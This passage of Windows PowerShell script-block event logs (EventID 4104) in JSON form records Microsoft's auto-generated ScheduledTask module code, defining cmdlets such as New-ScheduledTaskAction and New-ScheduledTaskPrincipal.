[object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('New', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991260Z"
    },
    "EventRecordID": 28,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 5,
    "MessageTotal": 19,
    "ScriptBlockText": "ModuleMember -Function 'New-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskAction\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Exec')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Id},\r\n\r\n    [Parameter(ParameterSetName='Exec', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Execute},\r\n\r\n    [Parameter(ParameterSetName='Exec', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Argument},\r\n\r\n    [Parameter(ParameterSetName='Exec', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${WorkingDirectory},\r\n\r\n    [Parameter(ParameterSetName='Exec')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Exec')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Exec')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Id')) {\r\n          [object]$__cmdletization_value = ${Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Execute')) {\r\n          [object]$__cmdletization_value = ${Execute}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Execute'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Execute'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Argument')) {\r\n          [object]$__cmdletization_value = ${Argument}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Argument'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Argument'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('WorkingDirectory')) {\r\n          [object]$__cmdletization_value = ${WorkingDirectory}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WorkingDirectory'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WorkingDirectory'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewActionByExec', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskAction' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskPrincipal\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='User', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Group', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${GroupId},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=5)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Id},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum]\r\n    ${RunLevel},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=2)]\r\n    [Parameter(ParameterSetName='User', Position=3)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum]\r\n    ${ProcessTokenSidType},\r\n\r\n    [Parameter(ParameterSetName='Group', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RequiredPrivilege},\r\n\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${UserId},\r\n\r\n    [Parameter(ParameterSetName='User', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.LogonTypeEnum]\r\n    ${LogonType},\r\n\r\n    [Parameter(ParameterSetName='Group')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Group')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Group')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = ",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991275Z"
    },
    "EventRecordID": 29,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 6,
    "MessageTotal": 19,
    "ScriptBlockText": "$true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Group') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GroupId')) {\r\n          [object]$__cmdletization_value = ${GroupId}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GroupId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GroupId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Id')) {\r\n          [object]$__cmdletization_value = ${Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunLevel')) {\r\n          [object]$__cmdletization_value = ${RunLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProcessTokenSidType')) {\r\n          [object]$__cmdletization_value = ${ProcessTokenSidType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RequiredPrivilege')) {\r\n          [object]$__cmdletization_value = ${RequiredPrivilege}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewPrincipalByGroup', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('User') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UserId')) {\r\n          [object]$__cmdletization_value = ${UserId}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UserId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UserId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('LogonType')) {\r\n          [object]$__cmdletization_value = ${LogonType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogonType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.LogonTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LogonType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.LogonTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Id')) {\r\n          [object]$__cmdletization_value = ${Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProcessTokenSidType')) {\r\n          [object]$__cmdletization_value = ${ProcessTokenSidType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProcessTokenSidType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ProcessTokenSidTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RequiredPrivilege')) {\r\n          [object]$__cmdletization_value = ${RequiredPrivilege}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequiredPrivilege'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunLevel')) {\r\n          [object]$__cmdletization_value = ${RunLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType ",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991284Z"
    },
    "EventRecordID": 30,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 7,
    "MessageTotal": 19,
